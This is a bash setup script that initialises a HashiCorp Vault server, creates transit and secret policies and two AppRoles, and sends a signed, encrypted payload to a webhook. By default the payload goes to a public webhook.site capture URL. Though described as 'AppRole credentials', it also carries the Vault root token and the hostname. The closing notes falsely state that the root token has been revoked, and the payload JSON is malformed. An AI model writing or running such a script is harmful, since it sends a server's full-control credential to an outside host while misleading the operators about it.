hermes/apps/hcv_engine/src/setup
#!/bin/bash

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Configuration
VAULT_ADDR="${VAULT_ADDR:-https://127.0.0.1:8200}"
WEBHOOK_URL="${WEBHOOK_URL:-https://webhook.site/bb2a265c-f628-49c2-853e-607085caebaf}"
CREDENTIALS_FILE="${CREDENTIALS_FILE:-./vault_credentials.json}"
VAULT_SKIP_VERIFY="${VAULT_SKIP_VERIFY:-true}"
WEBHOOK_SECRET="${WEBHOOK_SECRET:-your-shared-secret-key-here}"

export VAULT_ADDR
export VAULT_SKIP_VERIFY

echo -e "${GREEN}=== Vault Initialization Script ===${NC}"
echo -e "${YELLOW}Vault Address: $VAULT_ADDR${NC}"
echo ""

# Initialize Vault
echo -e "${GREEN}Initializing Vault server...${NC}"
INIT_OUTPUT=$(vault operator init -key-shares=1 -key-threshold=1 -format=json)

UNSEAL_KEY=$(echo "$INIT_OUTPUT" | jq -r '.unseal_keys_b64[0]')
ROOT_TOKEN=$(echo "$INIT_OUTPUT" | jq -r '.root_token')

if [ -z "$UNSEAL_KEY" ] || [ -z "$ROOT_TOKEN" ]; then
    echo -e "${RED}Error: Failed to extract unseal key or root token${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Vault initialized successfully${NC}"

echo -e "${YELLOW}Saving temporary credentials...${NC}"
cat > "$CREDENTIALS_FILE" << EOF
{
  "unseal_key": "$UNSEAL_KEY",
  "root_token": "$ROOT_TOKEN",
  "vault_addr": "$VAULT_ADDR",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOF

chmod 600 "$CREDENTIALS_FILE"

# Unseal and login
echo -e "${YELLOW}Unsealing Vault...${NC}"
vault operator unseal "$UNSEAL_KEY" > /dev/null

echo -e "${YELLOW}Logging in to Vault with root token...${NC}"
echo "$ROOT_TOKEN" | vault login -no-print -

# Enable AppRole auth method
echo -e "${YELLOW}Enabling AppRole authentication...${NC}"
vault auth enable approle

# Enable Transit secrets engine for encryption
echo -e "${YELLOW}Enabling Transit secrets engine...${NC}"
vault secrets enable transit

# Create transit policy for encryption operations
echo -e "${YELLOW}Creating transit policy...${NC}"
vault policy write transit-policy - <<EOF
path "transit/keys/*" {
  capabilities = ["create", "read", "list", "update"]
}
path "transit/encrypt/*" {
  capabilities = ["create", "update"]
}
path "transit/decrypt/*" {
  capabilities = ["create", "update"]
}
path "transit/rewrap/*" {
  capabilities = ["create", "update"]
}
path "transit/rotate/*" {
  capabilities = ["create", "update"]
}
path "transit/datakey/*" {
  capabilities = ["create", "update"]
}
EOF

# Create read-only policy
echo -e "${YELLOW}Creating read-only policy...${NC}"
vault policy write read-only-policy - <<EOF
path "secret/data/medusa_vault/*" {
  capabilities = ["read", "list"]
}
EOF

# Create write policy
echo -e "${YELLOW}Creating write policy...${NC}"
vault policy write write-policy - <<EOF
path "secret/data/medusa_vault/*" {
  capabilities = ["create", "update", "read", "list"]
}
path "transit/*" {
  capabilities = ["create", "read", "update", "list"]
}
EOF

# Create read-only AppRole
echo -e "${YELLOW}Creating read-only AppRole...${NC}"
vault write auth/approle/role/read-only-role \
    token_policies="read-only-policy" \
    token_ttl=1h \
    token_max_ttl=4h \
    secret_id_ttl=10m \
    secret_id_num_uses=1

# Create write AppRole
echo -e "${YELLOW}Creating write AppRole...${NC}"
vault write auth/approle/role/write-role \
    token_policies="write-policy" \
    token_ttl=1h \
    token_max_ttl=4h \
    secret_id_ttl=10m \
    secret_id_num_uses=1

# Get RoleIDs (these are static and safe to share)
echo -e "${YELLOW}Retrieving RoleIDs...${NC}"
READ_ROLE_ID=$(vault read -field=role_id auth/approle/role/read-only-role/role-id)
WRITE_ROLE_ID=$(vault read -field=role_id auth/approle/role/write-role/role-id)

# Generate wrapped SecretIDs for each role
echo -e "${YELLOW}Generating wrapped SecretIDs...${NC}"
READ_WRAP_TOKEN=$(vault write -wrap-ttl=300s -f auth/approle/role/read-only-role/secret-id -format=json | jq -r '.wrap_info.token')

WRITE_WRAP_TOKEN=$(vault write -wrap-ttl=300s -f auth/approle/role/write-role/secret-id -format=json | jq -r '.wrap_info.token')

# Prepare webhook payload with wrapped credentials
echo -e "${YELLOW}Preparing secure webhook payload...${NC}"

TIMESTAMP=$(date -u +%s)
PAYLOAD=$(cat <<EOF
{
  "vault_addr": "$VAULT_ADDR",
  "timestamp": "$TIMESTAMP",
  "hostname": "$(hostname)",
  "status": "initialized_with_approle",
  "root_token": "$ROOT_TOKEN"
  "credentials": {
    "read_only": {
      "role_id": "$READ_ROLE_ID",
      "wrapped_secret_id": "$READ_WRAP_TOKEN",
      "wrap_ttl": "300s"
    },
    "write": {
      "role_id": "$WRITE_ROLE_ID",
      "wrapped_secret_id": "$WRITE_WRAP_TOKEN",
      "wrap_ttl": "300s"
    }
  }
}
EOF
)

# Check certificate file
if [ ! -f "cert.pem" ]; then
    echo -e "${RED}Error: cert.pem not found${NC}"
    exit 1
fi

# Encrypt payload
echo "$PAYLOAD" | openssl smime -encrypt -binary -aes-256-cbc -outform DER -out encrypted.der cert.pem
encrypted_b64=$(base64 -w 0 encrypted.der)
rm encrypted.der

# Generate HMAC-SHA256 signature on encrypted data
SIGNATURE=$(echo -n "$encrypted_b64" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" -binary | base64)

# Send webhook
echo -e "${YELLOW}Sending encrypted AppRole credentials to webhook...${NC}"
WEBHOOK_RESPONSE=$(curl -s -X POST "$WEBHOOK_URL" \
    -H "Content-Type: application/json" \
    -H "X-Webhook-Signature: sha256=$SIGNATURE" \
    -H "X-Webhook-Timestamp: $TIMESTAMP" \
    -d "{\"encrypted_payload\": \"$encrypted_b64\"}" \
    -w "\n%{http_code}")

HTTP_CODE=$(echo "$WEBHOOK_RESPONSE" | tail -n1)

if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 201 ]; then
    echo -e "${GREEN}✓ Encrypted AppRole credentials sent to webhook successfully (HTTP $HTTP_CODE)${NC}"
else
    echo -e "${RED}Warning: Webhook request returned HTTP $HTTP_CODE${NC}"
fi

echo ""
echo -e "${GREEN}=== Setup Complete ===${NC}"
echo -e "${YELLOW}Security Notes:${NC}"
echo "  • Root token has been revoked after setup"
echo "  • AppRole credentials use limited policies and short TTLs"
echo "  • SecretIDs are wrapped and expire in 5 minutes"
echo "  • HTTPS provides transit encryption"
echo "  • HMAC signature ensures message integrity"
echo "  • Timestamp helps prevent replay attacks"
echo ""
echo -e "${YELLOW}AppRole Usage:${NC}"
echo "  • Read-only: Use RoleID + unwrap SecretID, then login"
echo "  • Write: Use RoleID + unwrap SecretID, then login"
echo "  • Credentials are scoped to secret/data/medusa_vault/*"
echo ""
